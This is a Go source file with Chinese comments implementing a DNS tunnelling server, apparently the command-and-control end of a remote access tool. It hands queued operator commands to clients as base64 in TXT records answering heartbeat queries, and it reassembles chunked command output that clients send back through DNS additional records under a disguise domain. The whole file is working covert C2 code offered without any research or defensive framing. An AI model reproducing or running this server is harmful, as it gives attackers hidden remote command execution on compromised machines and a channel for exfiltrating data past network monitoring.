/*
DNS隧道服务器 - 真正的DNS协议实现

功能说明：
- 监听UDP 53端口，处理真实的DNS查询请求
- 通过DNS TXT记录下发命令给客户端
- 接收客户端通过DNS查询上传的执行结果
- 与TCP控制端服务器协同工作，管理客户端会话
- 支持大数据分块传输和UTF-8编码
*/

package server

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

// DNS消息结构
type DNSHeader struct {
	ID      uint16 // 会话标识符
	Flags   uint16 // 标志位
	QDCount uint16 // 查询数量
	ANCount uint16 // 回答数量
	NSCount uint16 // 权威记录数量
	ARCount uint16 // 附加记录数量
}

// DNS查询类型常量
const (
	DNS_TYPE_A     = 1  // A记录
	DNS_TYPE_AAAA  = 28 // AAAA记录
	DNS_TYPE_CNAME = 5  // CNAME记录
	DNS_TYPE_TXT   = 16 // TXT记录 - 用于传输命令和数据
	DNS_CLASS_IN   = 1  // Internet类
)

// DNS标志位定义
const (
	DNS_FLAG_QR = 0x8000 // 查询(0)/响应(1)
	DNS_FLAG_AA = 0x0400 // 权威回答
	DNS_FLAG_RD = 0x0100 // 递归期望
	DNS_FLAG_RA = 0x0080 // 递归可用
)

// DNS隧道常量
const (
	DNS_DOMAIN_SUFFIX  = ".example.com" // 伪装域名后缀
	COMMAND_SUBDOMAIN  = "cmd"          // 命令子域名
	RESPONSE_SUBDOMAIN = "resp"         // 响应子域名
	DNS_TIMEOUT        = 10 * time.Second
)

// DNSServer DNS隧道服务器
type DNSServer struct {
	listenAddr string
	conn       *net.UDPConn
	tcpServer  *Server               // 关联的TCP服务器
	clients    map[string]*DNSClient // DNS客户端映射 (客户端IP -> DNSClient)
	mu         sync.Mutex
}

// DNSClient DNS隧道客户端
type DNSClient struct {
	ID           string              // 客户端唯一标识 (IP地址)
	Address      *net.UDPAddr        // 客户端UDP地址
	LastSeen     time.Time           // 最后活动时间
	CommandQueue chan string         // 待下发命令队列
	ChunkBuffer  map[string][]string // 分块数据缓冲区
	ChunkMutex   sync.Mutex          // 分块缓冲区互斥锁
	isConnected  bool                // 连接状态
}

// NewDNSServer 创建新的DNS服务器
func NewDNSServer(listenAddr string) *DNSServer {
	return &DNSServer{
		listenAddr: listenAddr,
		clients:    make(map[string]*DNSClient),
	}
}

// SetTCPServer 设置关联的TCP服务器
func (ds *DNSServer) SetTCPServer(tcpServer *Server) {
	ds.tcpServer = tcpServer
}

// Start 启动DNS服务器
func (ds *DNSServer) Start() error {
	// 解析监听地址
	addr, err := net.ResolveUDPAddr("udp", ds.listenAddr)
	if err != nil {
		return fmt.Errorf("解析DNS监听地址失败: %w", err)
	}

	// 监听UDP端口
	ds.conn, err = net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("启动DNS监听失败: %w", err)
	}
	defer ds.conn.Close()

	fmt.Printf("DNS隧道服务器已启动，监听: %s\n", ds.listenAddr)
	fmt.Printf("实际监听地址: %s\n", ds.conn.LocalAddr().String())

	// 启动定期清理过期客户端的后台任务
	ds.startPeriodicCleanup()

	// 处理DNS请求循环
	buffer := make([]byte, 1024)
	for {
		n, clientAddr, err := ds.conn.ReadFromUDP(buffer)
		if err != nil {
			fmt.Printf("读取DNS请求失败: %v\n", err)
			continue
		}

		// 并发处理每个DNS请求
		go ds.handleDNSRequest(buffer[:n], clientAddr)
	}
}

// handleDNSRequest 处理DNS请求
func (ds *DNSServer) handleDNSRequest(data []byte, clientAddr *net.UDPAddr) {
	// 解析DNS请求
	query, err := ds.parseDNSQuery(data)
	if err != nil {
		fmt.Printf("[DNS服务器] ❌ 解析DNS请求失败: %v\n", err)
		return
	}

	clientID := clientAddr.IP.String()

	// 确保客户端存在
	client := ds.getOrCreateClient(clientID, clientAddr)

	// 根据查询域名类型处理请求
	// 心跳查询域名格式：heartbeat.cmd.example.com
	heartbeatDomain := "heartbeat." + COMMAND_SUBDOMAIN + DNS_DOMAIN_SUFFIX

	if query.Domain == heartbeatDomain {
		// 心跳查询 - 精简日志输出
		fmt.Printf("[DNS服务器] 💓 心跳: %s\n", clientID)
		ds.handleHeartbeatQuery(query, client)
	} else if strings.Contains(query.Domain, RESPONSE_SUBDOMAIN+DNS_DOMAIN_SUFFIX) {
		// 结果查询 - 客户端上传执行结果
		fmt.Printf("[DNS服务器] 📥 结果查询: %s - %s\n", clientID,
			func() string {
				if len(query.Domain) > 50 {
					return query.Domain[:50] + "..."
				}
				return query.Domain
			}())
		ds.handleResultQuery(query, client)
	} else {
		// 其他查询 - 返回标准DNS响应
		fmt.Printf("[DNS服务器] ❓ 标准查询: %s - %s\n", clientID, query.Domain)
		ds.handleStandardQuery(query, client)
	}
}

// DNS查询结构
type DNSQuery struct {
	Header         DNSHeader
	Domain         string
	Type           uint16
	Class          uint16
	RawID          uint16
	AdditionalData string // 从附加记录中提取的Base64数据
}

// parseDNSQuery 解析DNS查询
func (ds *DNSServer) parseDNSQuery(data []byte) (*DNSQuery, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("DNS数据长度不足")
	}

	query := &DNSQuery{}

	// 解析DNS头部
	query.Header.ID = binary.BigEndian.Uint16(data[0:2])
	query.Header.Flags = binary.BigEndian.Uint16(data[2:4])
	query.Header.QDCount = binary.BigEndian.Uint16(data[4:6])
	query.Header.ANCount = binary.BigEndian.Uint16(data[6:8])
	query.Header.NSCount = binary.BigEndian.Uint16(data[8:10])
	query.Header.ARCount = binary.BigEndian.Uint16(data[10:12])

	query.RawID = query.Header.ID

	// 解析查询域名
	domain, offset, err := ds.parseDomainName(data, 12)
	if err != nil {
		return nil, fmt.Errorf("解析域名失败: %w", err)
	}
	query.Domain = domain

	// 解析查询类型和类
	if offset+4 > len(data) {
		return nil, fmt.Errorf("DNS查询数据不完整")
	}
	query.Type = binary.BigEndian.Uint16(data[offset : offset+2])
	query.Class = binary.BigEndian.Uint16(data[offset+2 : offset+4])
	offset += 4

	// 解析附加记录（如果存在）
	if query.Header.ARCount > 0 {
		additionalData, err := ds.parseAdditionalRecords(data, offset, int(query.Header.ARCount))
		if err != nil {
			fmt.Printf("[DNS服务器] 解析附加记录失败: %v\n", err)
		} else {
			query.AdditionalData = additionalData
		}
	}

	return query, nil
}

// parseDomainName 解析DNS域名
func (ds *DNSServer) parseDomainName(data []byte, offset int) (string, int, error) {
	var domain strings.Builder
	originalOffset := offset
	jumped := false

	for {
		if offset >= len(data) {
			return "", 0, fmt.Errorf("域名解析超出数据边界")
		}

		length := data[offset]

		if length == 0 {
			// 域名结束
			offset++
			break
		}

		if length&0xC0 == 0xC0 {
			// 压缩指针
			if !jumped {
				originalOffset = offset + 2
			}
			pointer := binary.BigEndian.Uint16(data[offset:offset+2]) & 0x3FFF
			offset = int(pointer)
			jumped = true
			continue
		}

		// 普通标签
		if offset+1+int(length) > len(data) {
			return "", 0, fmt.Errorf("域名标签长度超出数据边界")
		}

		if domain.Len() > 0 {
			domain.WriteByte('.')
		}
		domain.Write(data[offset+1 : offset+1+int(length)])
		offset += 1 + int(length)
	}

	if jumped {
		return domain.String(), originalOffset, nil
	}
	return domain.String(), offset, nil
}

// getOrCreateClient 获取或创建DNS客户端
func (ds *DNSServer) getOrCreateClient(clientID string, addr *net.UDPAddr) *DNSClient {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	client, exists := ds.clients[clientID]
	if !exists {
		client = &DNSClient{
			ID:           clientID,
			Address:      addr,
			LastSeen:     time.Now(),
			CommandQueue: make(chan string, 10),
			ChunkBuffer:  make(map[string][]string),
			isConnected:  true,
		}
		ds.clients[clientID] = client

		// 同步到TCP服务器的DNS客户端列表
		if ds.tcpServer != nil {
			ds.tcpServer.AddDNSClient(clientID, client)
		}

		fmt.Printf("[DNS服务器] ✅ 新客户端连接: %s (总数: %d)\n", clientID, len(ds.clients))
	} else {
		// 更新现有客户端的UDP地址，因为UDP端口可能会变化
		if client.Address.String() != addr.String() {
			client.Address = addr
		}
		// 心跳更新时不再输出日志，减少噪音
	}

	client.LastSeen = time.Now()
	return client
}

// handleHeartbeatQuery 处理心跳查询 - 检查是否有待下发命令
func (ds *DNSServer) handleHeartbeatQuery(query *DNSQuery, client *DNSClient) {
	var command string
	var hasCommand bool

	// 检查是否有待下发命令
	select {
	case command = <-client.CommandQueue:
		hasCommand = true
		fmt.Printf("[DNS服务器] 📤 下发命令给 %s: %s\n", client.ID, command)
	default:
		hasCommand = false
		// 心跳时不输出日志，减少噪音
	}

	// 构造DNS响应
	var response []byte
	if hasCommand {
		// 有命令 - 通过TXT记录返回Base64编码的命令
		encodedCommand := base64.URLEncoding.EncodeToString([]byte(command))
		response = ds.createTXTResponse(query, encodedCommand)
	} else {
		// 无命令 - 返回无应答记录的响应（ANCount=0）
		response = ds.createNoAnswerResponse(query)
	}

	// 发送DNS响应
	err := ds.sendDNSResponse(response, client.Address)
	if err != nil {
		fmt.Printf("[DNS服务器] ❌ 心跳响应发送失败给 %s: %v\n", client.ID, err)
	}
	// 成功发送心跳响应时不再输出日志，减少噪音
}

// handleResultQuery 处理结果查询 - 客户端上传执行结果
func (ds *DNSServer) handleResultQuery(query *DNSQuery, client *DNSClient) {
	fmt.Printf("[DNS服务器] 处理结果查询，客户端: %s\n", client.ID)

	// 从附加记录中获取Base64数据
	if query.AdditionalData == "" {
		fmt.Printf("[DNS服务器] 未找到附加记录数据\n")
		// 发送确认响应
		response := ds.createSimpleResponse(query)
		ds.sendDNSResponse(response, client.Address)
		return
	}

	// 解析域名，判断是否为分块数据
	domain := query.Domain

	// 检查是否为分块数据：chunk[index]of[total].resp.example.com
	if strings.Contains(domain, "chunk") && strings.Contains(domain, "of") {
		ds.handleChunkedResultWithData(domain, query.AdditionalData, client)
	} else {
		// 单个结果数据：result.resp.example.com
		ds.handleSingleResultWithData(query.AdditionalData, client)
	}

	// 发送确认响应
	response := ds.createSimpleResponse(query)
	err := ds.sendDNSResponse(response, client.Address)
	if err != nil {
		fmt.Printf("[DNS服务器] 发送结果确认失败: %v\n", err)
	}
}

// handleChunkedResult 处理分块结果
func (ds *DNSServer) handleChunkedResult(domain string, client *DNSClient) {
	// 解析分块信息：chunk[index]of[total].[base64_data].resp.example.com
	parts := strings.Split(domain, ".")
	if len(parts) < 3 {
		fmt.Printf("[DNS服务器] 分块域名格式错误: %s\n", domain)
		return
	}

	chunkInfo := parts[0]   // chunk[index]of[total]
	encodedData := parts[1] // base64_data

	// 解析chunk信息
	var chunkIndex, totalChunks int
	n, err := fmt.Sscanf(chunkInfo, "chunk%dof%d", &chunkIndex, &totalChunks)
	if n != 2 || err != nil {
		fmt.Printf("[DNS服务器] 解析分块信息失败: %s, 错误: %v\n", chunkInfo, err)
		return
	}

	fmt.Printf("[DNS服务器] 收到分块 %d/%d，数据长度: %d\n", chunkIndex, totalChunks, len(encodedData))

	client.ChunkMutex.Lock()
	defer client.ChunkMutex.Unlock()

	// 初始化分块缓冲区
	key := fmt.Sprintf("%d", totalChunks)
	if client.ChunkBuffer[key] == nil {
		client.ChunkBuffer[key] = make([]string, totalChunks)
	}

	// 存储分块数据
	client.ChunkBuffer[key][chunkIndex-1] = encodedData

	// 检查是否收到所有分块
	complete := true
	for i := 0; i < totalChunks; i++ {
		if client.ChunkBuffer[key][i] == "" {
			complete = false
			break
		}
	}

	if complete {
		// 所有分块收齐，组装完整数据
		var fullData strings.Builder
		for i := 0; i < totalChunks; i++ {
			fullData.WriteString(client.ChunkBuffer[key][i])
		}

		// 清空缓冲区
		delete(client.ChunkBuffer, key)

		// 处理完整结果
		ds.processCompleteResult(fullData.String(), client)
		fmt.Printf("[DNS服务器] 分块数据组装完成，总长度: %d\n", fullData.Len())
	}
}

// handleSingleResult 处理单个结果
func (ds *DNSServer) handleSingleResult(domain string, client *DNSClient) {
	// 解析域名：[base64_data].resp.example.com
	parts := strings.Split(domain, ".")
	if len(parts) < 3 {
		fmt.Printf("[DNS服务器] 单个结果域名格式错误: %s\n", domain)
		return
	}

	encodedData := parts[0]
	fmt.Printf("[DNS服务器] 收到单个结果，数据长度: %d\n", len(encodedData))

	// 处理完整结果
	ds.processCompleteResult(encodedData, client)
}

// handleChunkedResultWithData 处理分块结果（从附加记录获取数据）
func (ds *DNSServer) handleChunkedResultWithData(domain, encodedData string, client *DNSClient) {
	// 解析分块信息：chunk[index]of[total].resp.example.com
	parts := strings.Split(domain, ".")
	if len(parts) < 2 {
		fmt.Printf("[DNS服务器] 分块域名格式错误: %s\n", domain)
		return
	}

	chunkInfo := parts[0] // chunk[index]of[total]

	// 解析chunk信息
	var chunkIndex, totalChunks int
	n, err := fmt.Sscanf(chunkInfo, "chunk%dof%d", &chunkIndex, &totalChunks)
	if n != 2 || err != nil {
		fmt.Printf("[DNS服务器] 解析分块信息失败: %s, 错误: %v\n", chunkInfo, err)
		return
	}

	fmt.Printf("[DNS服务器] 收到分块 %d/%d，数据长度: %d\n", chunkIndex, totalChunks, len(encodedData))

	client.ChunkMutex.Lock()
	defer client.ChunkMutex.Unlock()

	// 初始化分块缓冲区
	key := fmt.Sprintf("%d", totalChunks)
	if client.ChunkBuffer[key] == nil {
		client.ChunkBuffer[key] = make([]string, totalChunks)
	}

	// 存储分块数据
	client.ChunkBuffer[key][chunkIndex-1] = encodedData

	// 检查是否收到所有分块
	complete := true
	for i := 0; i < totalChunks; i++ {
		if client.ChunkBuffer[key][i] == "" {
			complete = false
			break
		}
	}

	if complete {
		// 所有分块收齐，组装完整数据
		var fullData strings.Builder
		for i := 0; i < totalChunks; i++ {
			fullData.WriteString(client.ChunkBuffer[key][i])
		}

		// 清空缓冲区
		delete(client.ChunkBuffer, key)

		// 处理完整结果
		ds.processCompleteResult(fullData.String(), client)
		fmt.Printf("[DNS服务器] 分块数据组装完成，总长度: %d\n", fullData.Len())
	}
}

// handleSingleResultWithData 处理单个结果（从附加记录获取数据）
func (ds *DNSServer) handleSingleResultWithData(encodedData string, client *DNSClient) {
	fmt.Printf("[DNS服务器] 收到单个结果，数据长度: %d\n", len(encodedData))

	// 处理完整结果
	ds.processCompleteResult(encodedData, client)
}

// processCompleteResult 处理完整的结果数据
func (ds *DNSServer) processCompleteResult(encodedData string, client *DNSClient) {
	// Base64解码
	decodedData, err := base64.URLEncoding.DecodeString(encodedData)
	if err != nil {
		fmt.Printf("[DNS服务器] Base64解码失败: %v\n", err)
		return
	}

	// UTF-8校验
	if !utf8.Valid(decodedData) {
		fmt.Printf("[DNS服务器] UTF-8校验失败，数据可能损坏\n")
		return
	}

	result := string(decodedData)
	fmt.Printf("[DNS服务器] 收到客户端 %s 执行结果: %d 字符\n", client.ID, len(result))

	// 将结果通知给TCP控制端
	// 这里需要实现与TCP服务器的结果传递机制
	ds.notifyControllerResult(client.ID, result)
}

// notifyControllerResult 通知控制端执行结果
func (ds *DNSServer) notifyControllerResult(clientID, result string) {
	fmt.Printf("[DNS服务器] 通知控制端客户端 %s 的执行结果，长度: %d 字符\n", clientID, len(result))

	// 调用控制端的结果通知方法
	NotifyResult(clientID, result)
}

// handleStandardQuery 处理标准DNS查询
func (ds *DNSServer) handleStandardQuery(query *DNSQuery, client *DNSClient) {
	fmt.Printf("[DNS服务器] 处理标准DNS查询: %s\n", query.Domain)

	// 返回标准DNS响应（如A记录等）
	response := ds.createStandardResponse(query)
	err := ds.sendDNSResponse(response, client.Address)
	if err != nil {
		fmt.Printf("[DNS服务器] 发送标准响应失败: %v\n", err)
	}
}

// SendCommandToClient 向指定DNS客户端发送命令
func (ds *DNSServer) SendCommandToClient(clientID, command string) error {
	ds.mu.Lock()
	client, exists := ds.clients[clientID]
	ds.mu.Unlock()

	if !exists {
		return fmt.Errorf("DNS客户端 %s 不存在", clientID)
	}

	// 将命令放入队列
	select {
	case client.CommandQueue <- command:
		fmt.Printf("[DNS服务器] 命令已放入队列，等待客户端 %s 心跳查询: %s\n", clientID, command)
		return nil
	default:
		return fmt.Errorf("客户端 %s 命令队列已满", clientID)
	}
}

// ListClients 返回所有活跃的DNS客户端（30秒内有心跳）
func (ds *DNSServer) ListClients() []*DNSClient {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	const heartbeatTimeout = 30 * time.Second
	now := time.Now()

	// 过滤出活跃的客户端并清理过期客户端
	activeClients := make([]*DNSClient, 0)
	expiredClientIDs := make([]string, 0)

	for clientID, client := range ds.clients {
		timeSinceLastSeen := now.Sub(client.LastSeen)
		if timeSinceLastSeen <= heartbeatTimeout {
			// 活跃客户端
			activeClients = append(activeClients, client)
		} else {
			// 过期客户端，记录ID
			expiredClientIDs = append(expiredClientIDs, clientID)
			fmt.Printf("[DNS服务器] 发现过期客户端: %s (离线时间: %v)\n",
				clientID, timeSinceLastSeen.Round(time.Second))
		}
	}

	// 清理过期的客户端
	for _, clientID := range expiredClientIDs {
		delete(ds.clients, clientID)

		// 同步到TCP服务器
		if ds.tcpServer != nil {
			ds.tcpServer.RemoveDNSClient(clientID)
		}
	}

	fmt.Printf("[DNS服务器] ListClients调用 - 总客户端: %d, 活跃客户端: %d, 清理过期: %d\n",
		len(activeClients)+len(expiredClientIDs), len(activeClients), len(expiredClientIDs))

	for i, client := range activeClients {
		lastSeen := now.Sub(client.LastSeen).Round(time.Second)
		fmt.Printf("[DNS服务器] 活跃客户端 %d: ID=%s, 最后活动=%v前\n",
			i+1, client.ID, lastSeen)
	}

	return activeClients
}

// createTXTResponse 创建TXT记录DNS响应
func (ds *DNSServer) createTXTResponse(query *DNSQuery, txtData string) []byte {
	response := make([]byte, 0, 512)

	// DNS头部 - 设置为响应
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], query.RawID)                                     // ID
	binary.BigEndian.PutUint16(header[2:4], DNS_FLAG_QR|DNS_FLAG_AA|DNS_FLAG_RD|DNS_FLAG_RA) // 标志
	binary.BigEndian.PutUint16(header[4:6], 1)                                               // QDCOUNT (查询数量)
	binary.BigEndian.PutUint16(header[6:8], 1)                                               // ANCOUNT (回答数量)
	binary.BigEndian.PutUint16(header[8:10], 0)                                              // NSCOUNT
	binary.BigEndian.PutUint16(header[10:12], 0)                                             // ARCOUNT

	response = append(response, header...)

	// 查询部分 - 回显原查询
	domainBytes := ds.encodeDomainName(query.Domain)
	response = append(response, domainBytes...)

	typeClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeClass[0:2], query.Type)  // QTYPE
	binary.BigEndian.PutUint16(typeClass[2:4], query.Class) // QCLASS
	response = append(response, typeClass...)

	// 回答部分 - TXT记录
	// 域名指针 (压缩指向查询中的域名)
	response = append(response, 0xC0, 0x0C) // 指向偏移12(查询域名开始位置)

	// 类型、类、TTL、数据长度
	answerData := make([]byte, 10)
	binary.BigEndian.PutUint16(answerData[0:2], DNS_TYPE_TXT) // TYPE
	binary.BigEndian.PutUint16(answerData[2:4], DNS_CLASS_IN) // CLASS
	binary.BigEndian.PutUint32(answerData[4:8], 300)          // TTL (5分钟)

	// TXT数据
	txtBytes := []byte(txtData)
	dataLength := len(txtBytes) + 1                                  // +1 for length byte
	binary.BigEndian.PutUint16(answerData[8:10], uint16(dataLength)) // RDLENGTH

	response = append(response, answerData...)

	// TXT记录数据 (长度字节 + 数据)
	response = append(response, byte(len(txtBytes)))
	response = append(response, txtBytes...)

	return response
}

// createSimpleResponse 创建简单DNS响应
func (ds *DNSServer) createSimpleResponse(query *DNSQuery) []byte {
	response := make([]byte, 0, 512)

	// DNS头部 - 设置为响应
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], query.RawID)                                     // ID
	binary.BigEndian.PutUint16(header[2:4], DNS_FLAG_QR|DNS_FLAG_AA|DNS_FLAG_RD|DNS_FLAG_RA) // 标志
	binary.BigEndian.PutUint16(header[4:6], 1)                                               // QDCOUNT
	binary.BigEndian.PutUint16(header[6:8], 0)                                               // ANCOUNT (无回答)
	binary.BigEndian.PutUint16(header[8:10], 0)                                              // NSCOUNT
	binary.BigEndian.PutUint16(header[10:12], 0)                                             // ARCOUNT

	response = append(response, header...)

	// 查询部分 - 回显原查询
	domainBytes := ds.encodeDomainName(query.Domain)
	response = append(response, domainBytes...)

	typeClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeClass[0:2], query.Type)  // QTYPE
	binary.BigEndian.PutUint16(typeClass[2:4], query.Class) // QCLASS
	response = append(response, typeClass...)

	return response
}

// createNoAnswerResponse 创建无应答记录的DNS响应
func (ds *DNSServer) createNoAnswerResponse(query *DNSQuery) []byte {
	response := make([]byte, 0, 512)

	// DNS头部 - 设置为响应，无应答记录
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], query.RawID)                                     // ID
	binary.BigEndian.PutUint16(header[2:4], DNS_FLAG_QR|DNS_FLAG_AA|DNS_FLAG_RD|DNS_FLAG_RA) // 标志
	binary.BigEndian.PutUint16(header[4:6], 1)                                               // QDCOUNT (查询数量)
	binary.BigEndian.PutUint16(header[6:8], 0)                                               // ANCOUNT (回答数量) - 关键：设为0表示无命令
	binary.BigEndian.PutUint16(header[8:10], 0)                                              // NSCOUNT
	binary.BigEndian.PutUint16(header[10:12], 0)                                             // ARCOUNT

	response = append(response, header...)

	// 查询部分 - 回显原查询
	domainBytes := ds.encodeDomainName(query.Domain)
	response = append(response, domainBytes...)

	typeClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeClass[0:2], query.Type)  // QTYPE
	binary.BigEndian.PutUint16(typeClass[2:4], query.Class) // QCLASS
	response = append(response, typeClass...)

	// 无应答部分 - 客户端通过ANCount=0判断无命令

	return response
}

// createStandardResponse 创建标准DNS响应
func (ds *DNSServer) createStandardResponse(query *DNSQuery) []byte {
	// 对于标准查询，返回简单响应
	return ds.createSimpleResponse(query)
}

// encodeDomainName 编码DNS域名
func (ds *DNSServer) encodeDomainName(domain string) []byte {
	var result []byte
	labels := strings.Split(domain, ".")

	for _, label := range labels {
		if label == "" {
			continue
		}
		labelBytes := []byte(label)
		result = append(result, byte(len(labelBytes)))
		result = append(result, labelBytes...)
	}

	result = append(result, 0) // 域名结束标志
	return result
}

// sendDNSResponse 发送DNS响应
func (ds *DNSServer) sendDNSResponse(response []byte, clientAddr *net.UDPAddr) error {
	// 检查UDP连接状态
	if ds.conn == nil {
		return fmt.Errorf("UDP连接未建立")
	}

	n, err := ds.conn.WriteToUDP(response, clientAddr)
	if err != nil {
		fmt.Printf("[DNS服务器] ❌ 发送DNS响应失败给 %s: %v\n", clientAddr.IP.String(), err)
		return fmt.Errorf("发送DNS响应失败: %w", err)
	}

	// 验证发送是否完整
	if n != len(response) {
		fmt.Printf("[DNS服务器] ⚠️  发送不完整给 %s: 期望%d, 实际%d\n",
			clientAddr.IP.String(), len(response), n)
	}

	return nil
}

// GetClient 根据客户端ID获取DNS客户端
func (ds *DNSServer) GetClient(clientID string) *DNSClient {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	return ds.clients[clientID]
}

// RemoveClient 移除DNS客户端
func (ds *DNSServer) RemoveClient(clientID string) {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	if client, exists := ds.clients[clientID]; exists {
		client.isConnected = false
		delete(ds.clients, clientID)

		// 从TCP服务器移除
		if ds.tcpServer != nil {
			ds.tcpServer.RemoveDNSClient(clientID)
		}

		fmt.Printf("[DNS服务器] DNS客户端 %s 已移除\n", clientID)
	}
}

// startPeriodicCleanup 启动定期清理过期客户端的后台任务
func (ds *DNSServer) startPeriodicCleanup() {
	ticker := time.NewTicker(10 * time.Second) // 每10秒检查一次
	go func() {
		defer ticker.Stop()
		for range ticker.C {
			ds.cleanupExpiredClients()
		}
	}()
}

// cleanupExpiredClients 清理过期的客户端
func (ds *DNSServer) cleanupExpiredClients() {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	const heartbeatTimeout = 30 * time.Second
	now := time.Now()
	expiredClientIDs := make([]string, 0)

	for clientID, client := range ds.clients {
		if now.Sub(client.LastSeen) > heartbeatTimeout {
			expiredClientIDs = append(expiredClientIDs, clientID)
		}
	}

	if len(expiredClientIDs) > 0 {
		fmt.Printf("[DNS服务器] 定期清理 - 发现 %d 个过期客户端\n", len(expiredClientIDs))
		for _, clientID := range expiredClientIDs {
			delete(ds.clients, clientID)
			fmt.Printf("[DNS服务器] 清理过期客户端: %s\n", clientID)

			// 同步到TCP服务器
			if ds.tcpServer != nil {
				ds.tcpServer.RemoveDNSClient(clientID)
			}
		}
	}
}

// parseAdditionalRecords 解析DNS附加记录，提取TXT记录中的Base64数据
func (ds *DNSServer) parseAdditionalRecords(data []byte, offset int, count int) (string, error) {
	for i := 0; i < count; i++ {
		// 跳过名称（通常是压缩指针）
		if offset >= len(data) {
			return "", fmt.Errorf("附加记录偏移超界")
		}

		if data[offset]&0xC0 == 0xC0 {
			offset += 2 // 跳过压缩指针
		} else {
			// 解析完整域名
			_, nextOffset, err := ds.parseDomainName(data, offset)
			if err != nil {
				return "", fmt.Errorf("解析附加记录域名失败: %w", err)
			}
			offset = nextOffset
		}

		// 读取类型、类别、TTL、数据长度
		if offset+10 > len(data) {
			return "", fmt.Errorf("附加记录头部数据不足")
		}

		recordType := binary.BigEndian.Uint16(data[offset : offset+2])
		offset += 2
		recordClass := binary.BigEndian.Uint16(data[offset : offset+2])
		offset += 2
		offset += 4 // 跳过TTL

		dataLength := binary.BigEndian.Uint16(data[offset : offset+2])
		offset += 2

		// 如果是TXT记录，提取数据
		if recordType == DNS_TYPE_TXT && recordClass == DNS_CLASS_IN {
			if dataLength > 0 && offset+int(dataLength) <= len(data) {
				txtData := data[offset : offset+int(dataLength)]
				if len(txtData) > 1 {
					txtLength := int(txtData[0])
					if txtLength > 0 && 1+txtLength <= len(txtData) {
						base64Data := string(txtData[1 : 1+txtLength])
						fmt.Printf("[DNS服务器] 从附加记录提取Base64数据，长度: %d\n", len(base64Data))
						return base64Data, nil
					}
				}
			}
		}

		// 跳过数据部分
		offset += int(dataLength)
	}

	return "", nil // 没有找到有效的TXT数据
}
